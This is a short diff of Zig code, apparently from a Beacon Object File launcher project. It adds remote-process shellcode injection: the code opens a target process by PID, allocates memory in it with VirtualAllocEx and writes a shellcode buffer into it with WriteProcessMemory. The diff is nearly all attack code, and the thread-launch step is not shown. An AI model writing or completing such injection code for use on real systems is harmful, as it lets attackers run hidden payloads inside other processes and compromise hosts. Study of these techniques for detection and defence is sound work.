@@ -58,11 +58,26 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     }
 
     const process = w32.OpenProcess(
-        w32.PROCESS_VM_READ | w32.PROCESS_VM_WRITE | w32.PROCESS_CREATE_THREAD,
+        w32.PROCESS_VM_WRITE | w32.PROCESS_CREATE_THREAD | w32.PROCESS_VM_OPERATION,
         w32.FALSE,
         @bitCast(pid),
     ) orelse return 0xff;
     defer _ = w32.CloseHandle(process);
+
+    const addr = w32.VirtualAllocEx(
+        process,
+        null,
+        shellcode_bytes.len,
+        w32.MEM_COMMIT | w32.MEM_RESERVE,
+        w32.PAGE_READWRITE,
+    ) orelse return 0xff;
+    defer _ = w32.VirtualFreeEx(process, addr, shellcode_bytes.len, w32.MEM_RELEASE);
+
+    {
+        var num_bytes: w32.SIZE_T = 0;
+        const res = w32.WriteProcessMemory(process, addr, shellcode_bytes.ptr, shellcode_bytes.len, &num_bytes);
+        if (res == w32.FALSE or num_bytes != shellcode_bytes.len) return 0xff;
+    }
 
     //const exit_code = bof_launcher.run(bof_bytes) catch return 0xff;
     //return exit_code + 5;
